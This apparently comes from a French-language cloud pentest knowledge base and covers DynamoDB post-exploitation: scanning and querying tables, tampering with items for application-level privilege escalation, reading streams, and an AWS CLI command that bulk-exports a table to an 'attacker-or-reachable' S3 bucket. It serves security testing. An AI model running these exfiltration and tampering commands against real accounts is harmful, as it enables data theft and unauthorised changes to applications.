---
title: "DynamoDB : lire et exporter des tables via Scan et export"
order: 2
description: "Lire et altérer des tables DynamoDB via Scan et Query, et exporter des tables vers S3."
keywords:
  - DynamoDB
  - Scan
  - Query
  - table
  - export
---

# DynamoDB

DynamoDB n'a pas de surface réseau : l'accès repose entièrement sur IAM. Un principal détenant `dynamodb:Scan` ou `dynamodb:Query` lit le contenu de la table directement via l'API, et `dynamodb:ExportTableToPointInTime` déverse une table entière vers S3 pour une exfiltration en masse. Les actions d'écriture (`PutItem`, `UpdateItem`, `DeleteItem`) permettent d'altérer l'état de l'application, ce qui compte lorsque la table sous-tend l'autorisation ou des soldes.

## Lire des tables

```bash
aws dynamodb list-tables
aws dynamodb scan --table-name <t> --output json          # whole table
aws dynamodb query --table-name <t> \
  --key-condition-expression 'pk = :v' \
  --expression-attribute-values '{":v":{"S":"tenant#1"}}'
```

## Export en masse vers S3

```bash
aws dynamodb export-table-to-point-in-time \
  --table-arn <arn> --s3-bucket <attacker-or-reachable-bucket> \
  --export-format DYNAMODB_JSON
```

## Notes d'exploitation

- `Scan` est coûteux et paginé ; les grandes tables sortent plus vite via l'export point-in-time, qui requiert que la table ait la PITR activée.
- Les écritures sur une table qui stocke des rôles, des droits ou des feature flags peuvent constituer une élévation de privilèges au niveau applicatif, indépendante d'IAM.
- Les streams (`dynamodb:GetRecords` sur le stream d'une table) laissent fuir les modifications en cours là où ils sont activés.

## Outils

- **AWS CLI** (`dynamodb scan`, `export-table-to-point-in-time`).
- **Pacu** (`dynamodb__scan`) : énumérer et déverser des tables à travers les régions.

## Références

- [AWS: exporting DynamoDB to S3](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/S3DataExport.html)
- [HackTricks Cloud: AWS DynamoDB](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [CloudFox: enumerating and looting cloud data stores](https://github.com/BishopFox/cloudfox)
- [Datadog Security Labs: AWS attack research](https://securitylabs.datadoghq.com/)
